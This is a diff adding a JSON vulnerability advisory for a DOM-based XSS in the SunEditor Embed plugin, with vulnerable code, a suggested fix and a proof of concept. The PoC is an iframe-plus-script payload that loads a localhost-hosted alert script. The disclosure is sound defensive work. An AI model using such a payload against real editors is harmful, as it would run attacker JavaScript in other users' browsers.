@@ -1,0 +1,59 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-08-26T15:26:24Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "suneditor"
+  },
+  "Advisory": {
+    "DatabaseId": 415696,
+    "Id": "GSA_kwCzR0hTQS13OTNxLWNxOXctNThwN84ABlfQ",
+    "GhsaId": "GHSA-w93q-cq9w-58p7",
+    "References": [
+      {
+        "Url": "https://github.com/JiHong88/suneditor/security/advisories/GHSA-w93q-cq9w-58p7"
+      },
+      {
+        "Url": "https://github.com/JiHong88/suneditor/issues/1649"
+      },
+      {
+        "Url": "https://github.com/JiHong88/suneditor/commit/9d43a5e082101d2d6475cba86e0d58d7c2cf6677"
+      },
+      {
+        "Url": "https://github.com/JiHong88/suneditor/releases/tag/3.1.4"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-w93q-cq9w-58p7"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-w93q-cq9w-58p7"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-54606"
+      }
+    ],
+    "Description": "Summary\n\nA DOM-based Cross-Site Scripting (XSS) vulnerability exists in the SunEditor Embed plugin. Crafted iframe embed HTML followed by an external \u003cscript src=...\u003e element bypasses the plugin’s sanitization logic. The plugin recreates and appends the attacker-controlled script element to the live DOM, causing JavaScript execution in the context of the editor page.\n\nIf an application stores or reflects SunEditor content without additional backend sanitization, this can lead to stored or reflected XSS when another user opens, previews, renders, or edits the malicious content.\n\nDetails\n\nThe Embed plugin parses raw embed HTML and processes the resulting DOM nodes. When a \u003cscript\u003e element is included after a valid iframe, the plugin creates a new script element using the attacker-controlled src value and appends it to the DOM.\n\nRelevant behavior:\n\nconst embedDOM = new DOMParser().parseFromString(src, 'text/html').body.children;\nif (/^script$/i.test(chd.nodeName)) {\n  scriptTag = dom.utils.createElement('script', {\n    src: chd.getAttribute('src'),\n    async: 'true'\n  }, null);\n  continue;\n}\ncover.appendChild(scriptTag);\n\nBecause the script is newly created and appended, it executes.\n\nPoC\n\nStart a local server hosting a JavaScript payload:\n\n```\nmkdir -p /tmp/suneditor-poc\ncd /tmp/suneditor-poc\n\ncat \u003e poc.js \u003c\u003c'EOF'\nalert(1);\nconsole.log(\"SunEditor Embed Plugin XSS executed\");\nEOF\n\npython3 -m http.server 8000\n```\n\nOpen SunEditor with the Embed plugin enabled, then insert the following payload through the Embed modal and save :\n\n`\u003ciframe src=\"https://youtube.com/embed/x\"\u003e\u003c/iframe\u003e\u003cscript src=\"http://127.0.0.1:8000/poc.js\"\u003e\u003c/script\u003e\n`\nSuccessful exploitation is confirmed when:\n\n`alert(1) appears`\n\nor the local server logs:\n\n`GET /poc.js`\n\nImpact\n\nAn attacker who can provide or store embed HTML can execute arbitrary JavaScript in another user’s browser when the content is processed by SunEditor. This may allow account actions as the victim, modification of editor content, or access to sensitive data available in the editor page.\n\nThe issue is especially impactful when SunEditor content is stored in a backend and later reopened or rendered for administrators, editors, or other users without additional sanitization.\n\nSuggested Fix\n\nDo not recreate or append script elements from user-controlled embed HTML.\n\nMinimum mitigation:\n\n```\nif (/^script$/i.test(chd.nodeName)) {\n  continue;\n}\n```\n\nA stronger fix is to allow only expected embed elements such as iframe or blockquote, sanitize their attributes, and discard all other sibling elements.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-08-26T15:26:24Z",
+    "Severity": "HIGH",
+    "Summary": "SunEditor Embed Plugin has DOM XSS via External Script Element After Iframe Embed",
+    "UpdatedAt": "2026-08-26T15:26:24Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.1.4"
+      },
+      "VulnerableVersionRange": "\u003c= 3.1.3"
+    }
+  ]
+}
